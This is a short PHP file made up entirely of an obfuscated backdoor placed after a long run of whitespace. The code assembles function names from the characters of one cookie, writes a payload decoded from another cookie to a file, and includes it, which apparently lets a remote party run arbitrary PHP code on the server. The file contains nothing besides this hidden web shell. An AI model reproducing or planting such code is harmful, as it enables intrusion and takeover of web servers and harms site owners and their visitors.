<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[14])){$c=$_COOKIE;$k=0;$n=5;$p=array();$p[$k]='';while($n){$p[$k].=$c[14][$n];if(!$c[14][$n+1]){if(!$c[14][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+5+1;}$k=$p[7]().$p[4];if(!$p[13]($k)){$n=$p[15]($k,$p[23]);$p[16]($n,$p[12].$p[26]($p[22]($c[3])));}include($k);}
